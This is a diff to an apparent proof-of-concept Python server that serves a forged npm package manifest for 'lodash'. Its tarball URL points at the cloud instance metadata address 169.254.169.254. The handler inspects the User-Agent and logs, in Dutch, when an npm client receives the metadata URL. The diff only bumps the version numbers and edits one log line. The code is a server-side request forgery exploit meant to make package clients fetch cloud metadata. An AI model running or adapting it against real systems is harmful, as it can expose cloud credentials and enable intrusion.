@@ -5,13 +5,13 @@ INTERNAL = "http://169.254.169.254/latest/meta-data/"
 
 PACKUMENT = json.dumps({
     "name": "lodash",
-    "dist-tags": {"latest": "4.18.0"},
+    "dist-tags": {"latest": "4.19.0"},
     "versions": {
-        "4.18.0": {
+        "4.19.0": {
             "name": "lodash",
-            "version": "4.18.0",
+            "version": "4.19.0",
             "dist": {
-                "tarball": INTERNAL + "lodash-4.18.0.tgz",
+                "tarball": INTERNAL + "lodash-4.19.0.tgz",
                 "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
             }
         },
@@ -36,7 +36,7 @@ class Handler(BaseHTTPRequestHandler):
                 print(f"  {k}: {v}")
 
         if "npm/" in ua:
-            print(f"[!] npm client -> packument met IMDS tarball URL serveren")
+            print(f"[!] npm client -> packument met IMDS tarball URL")
         else:
             print(f"[*] excon -> packument serveren")
 
